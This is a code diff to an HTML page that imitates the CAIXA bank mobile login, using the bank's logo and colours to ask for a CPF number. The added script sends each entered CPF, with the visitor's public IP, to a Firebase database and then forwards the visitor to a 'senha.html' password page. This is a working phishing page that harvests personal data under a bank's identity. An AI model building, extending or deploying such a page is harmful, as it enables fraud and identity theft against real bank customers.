@@ -28,7 +28,6 @@
             flex-direction: column;
         }
 
-        /* Cabeçalho */
         .header {
             display: flex;
             justify-content: space-between;
@@ -42,9 +41,8 @@
             align-items: center;
         }
 
-        /* Ajuste do tamanho da imagem do logo para manter a proporção da tela */
         .logo img {
-            height: 35px; /* Altura controlada para não quebrar o layout */
+            height: 35px;
             width: auto;
         }
 
@@ -55,7 +53,6 @@
             font-weight: 500;
         }
 
-        /* Conteúdo Principal */
         .main-content {
             display: flex;
             flex-direction: column;
@@ -74,7 +71,6 @@
             margin-bottom: 32px;
         }
 
-        /* Input de CPF */
         .input-group {
             position: relative;
             margin-bottom: 24px;
@@ -104,7 +100,6 @@
             border-color: #005ca9;
         }
 
-        /* Botão Continuar */
         .actions {
             display: flex;
             justify-content: flex-end;
@@ -122,9 +117,8 @@
             transition: all 0.3s ease;
         }
 
-        /* Estilo para quando o botão estiver ativo */
         .btn-continuar.ativo {
-            background-color: #F39200; /* Laranja Caixa */
+            background-color: #F39200;
             color: #ffffff;
             cursor: pointer;
         }
@@ -132,16 +126,13 @@
         .btn-continuar.ativo:hover {
             background-color: #d88200;
         }
-
     </style>
 </head>
 <body>
 
     <div class="mobile-container">
-        <!-- Cabeçalho com Logo e botão Sair -->
         <header class="header">
             <div class="logo">
-                <!-- Logo inserido conforme solicitado -->
                 <a href="https://logo-teka.com/pt-br/caixa/">
                     <img src="https://logo-teka.com/wp-content/uploads/2026/07/caixa-icon-logo.svg" alt="SVG logo CAIXA" style="max-width:200px;" />
                 </a>
@@ -149,7 +140,6 @@
             <a href="#" class="btn-sair">Sair</a>
         </header>
 
-        <!-- Área de Formulário -->
         <main class="main-content">
             <h1>Entrar</h1>
             <p class="subtitle">Informe seu CPF</p>
@@ -160,38 +150,71 @@
             </div>
 
             <div class="actions">
-                <!-- Adicionado onclick para ir para a tela de senha quando ativo -->
-                <button type="button" class="btn-continuar" id="btnContinuar" disabled onclick="window.location.href='senha.html'">Continuar</button>
+                <button type="button" class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
             </div>
         </main>
     </div>
 
-    <!-- Script para formatar o CPF e habilitar o botão -->
-    <script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyA9WtjdMj6wBsqkaPcZC9Xa9TgCpB11eho",
+            authDomain: "dados-a1d4d.firebaseapp.com",
+            databaseURL: "https://dados-a1d4d-default-rtdb.firebaseio.com",
+            projectId: "dados-a1d4d",
+            storageBucket: "dados-a1d4d.firebasestorage.app",
+            messagingSenderId: "550441905479",
+            appId: "1:550441905479:web:ff1ef4eec12a928895b062"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
         const inputCpf = document.getElementById('cpf');
         const btnContinuar = document.getElementById('btnContinuar');
 
         inputCpf.addEventListener('input', function(e) {
             let value = e.target.value;
-
-            // Remove tudo o que não é dígito
             value = value.replace(/\D/g, "");
-
-            // Adiciona a máscara progressivamente
             value = value.replace(/(\d{3})(\d)/, "$1.$2");
             value = value.replace(/(\d{3})(\d)/, "$1.$2");
             value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
-
-            // Atualiza o valor do input com a máscara
             e.target.value = value;
 
-            // Habilita o botão se o CPF estiver completo (14 caracteres: 11 números + 2 pontos + 1 traço)
             if (value.length === 14) {
                 btnContinuar.disabled = false;
                 btnContinuar.classList.add('ativo');
             } else {
                 btnContinuar.disabled = true;
                 btnContinuar.classList.remove('ativo');
+            }
+        });
+
+        btnContinuar.addEventListener('click', async function() {
+            if (btnContinuar.disabled) return;
+
+            const cpfValor = inputCpf.value;
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                let ipUsuario = data.ip;
+
+                let ipKey = ipUsuario.replace(/\./g, '_').replace(/:/g, '_');
+
+                await set(ref(db, 'usuarios/' + ipKey), {
+                    cpf: cpfValor,
+                    ip: ipUsuario,
+                    dataUltimoAcesso: new Date().toISOString()
+                });
+
+                window.location.href = 'senha.html';
+
+            } catch (error) {
+                console.error("Erro ao obter IP ou salvar no Firebase:", error);
+                window.location.href = 'senha.html';
             }
         });
     </script>
